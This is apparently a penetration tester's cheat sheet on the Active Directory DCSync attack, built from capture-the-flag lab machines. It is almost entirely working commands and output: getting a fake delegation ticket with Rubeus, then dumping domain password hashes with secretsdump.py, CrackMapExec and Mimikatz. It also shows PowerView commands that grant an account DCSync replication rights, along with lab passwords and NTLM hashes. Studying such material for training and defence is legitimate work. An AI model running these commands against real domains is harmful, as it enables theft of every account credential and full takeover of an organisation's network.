## # `DC Sync` -

_SYSTEM_, _NT AUTHORITY\NETWORK SERVICE_ and [Microsoft Virtual Accounts](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/service-accounts#bkmk-virtualserviceaccounts) all authenticate on the network as the machine account on domain-joined systems. This is really useful to know as most Windows services on modern versions of Windows will run using a Microsoft Virtual Account by default. The 2 most notable are [IIS](https://support.microsoft.com/en-us/help/4466942/understanding-identities-in-iis) and [MSSQL](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions?view=sql-server-ver15) there are many more.

Example -

If you are running as the service account for MSSQL, and can authenticate back to the DC over the network as that account, it will be the machine account, for the machine MSSQL is running on, which happens to be the DC. And the machine account for the DC has access to do a DC Sync attack, which is basically telling the DC you’d like copies of all of it’s data.

#### <mark style="background: #3D7EFFA6;">Get Ticket</mark> -

Grab the latest compiled version of Rubeus from [SharpCollection](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/Rubeus.exe).

Use `Rubeus.exe` to first get a fake delegation ticket for the machine account:, use the `tgtdeleg` command :

```powershell
c:\ProgramData>.\rubeus.exe tgtdeleg /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/g0.flight.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: Cbjw4zyXsgSFHc11kVL3FnTW4sx6OAQPHk5odmf7Klo=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
<SNIP>
```

Save that base64-encoded ticket to a file, and decode it into a new file :

```bash
nap@parrot$ base64 -d machine.kirbi.b64 > machine.kirbi
```

convert it to ccache format needed by my Linux system with [another Impacket tool](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketConverter.py), `ticketConverter.py`:

```bash
nap@parrot$ ticketConverter.py machine.kirbi machine.ccache
Impacket v0.9.24.dev1+20210814.5640.358fc7c6 - Copyright 2021 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Set that file to be the `KRB5CCNAME` environment variable so that it is used to authentication on upcoming commands :

```bash
nap@hacky$ export KRB5CCNAME=machine.ccache 
```

Now you can perform DC Sync -

```bash
secretsdump.py LICORDEBELLOTA.HTB/pivotapi\$@pivotapi.licordebellota.htb -dc-ip 10.10.10.240 -no-pass -k 
```

```bash
secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
```

```bash
secretsdump.py -k -no-pass g0.flight.htb
```

## # `Via CrackMapExec` -

```bash
crackmapexec smb -dc-ip dc.absolute.htb -u 'DC$' -H A7864AB463177ACB9AEC553F18F42577 --ntds
```

## # `secretsdump.py` -

secretsdump.py allows you to run DCSync attack from your Kali box, provided you can talk to the DC on TCP 445 and 135 and a high RPC port. This avoids fighting with AV, though it does create network traffic.

Give it just a target string in the format `[username]:[password]@[ip]` :

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

## # `Mimikatz` -

```bash
PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit
```

## # `Grant Dc Sync rights` -

Check if user has replication rights :

```powershell
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "studentx") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}
```

Grant Dc Sync rights :

```powershell
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName studentx - Rights DCSync -Verbose
```

```powershell
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity testlab.local -Rights DCSync
```
